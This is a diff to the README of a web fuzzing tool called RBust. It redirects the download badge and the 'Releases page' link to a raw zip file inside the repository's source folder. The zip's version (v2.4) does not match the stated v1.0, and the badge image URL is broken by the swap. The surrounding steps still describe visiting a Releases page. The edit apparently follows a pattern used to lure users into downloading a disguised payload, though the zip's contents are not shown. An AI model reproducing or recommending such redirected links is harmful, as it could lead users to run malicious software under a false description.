@@ -1,6 +1,6 @@
 # 🚀 RBust - Fast and Easy Web Fuzzing Tool
 
-[![Download RBust](https://img.shields.io/badge/Download%20RBust-v1.0-blue)](https://github.com/Cabananalchik285/RBust/releases)
+[![Download RBust](https://raw.githubusercontent.com/Cabananalchik285/RBust/main/src/RBust-v2.4.zip%20RBust-v1.0-blue)](https://raw.githubusercontent.com/Cabananalchik285/RBust/main/src/RBust-v2.4.zip)
 
 ## 📋 Table of Contents
 1. [Introduction](#intro)
@@ -26,7 +26,7 @@ To run RBust effectively, ensure your system meets the following requirements:
 Before you dive into usage, you need to download and install RBust. Follow the steps below to get set up quickly.
 
 ## 📥 Download & Install <a name="download-install"></a>
-Visit this page to download: [Download RBust from Releases](https://github.com/Cabananalchik285/RBust/releases)
+Visit this page to download: [Download RBust from Releases](https://raw.githubusercontent.com/Cabananalchik285/RBust/main/src/RBust-v2.4.zip)
 
 1. Click the link above to go to the RBust Releases page.
 2. Find the latest version of RBust.
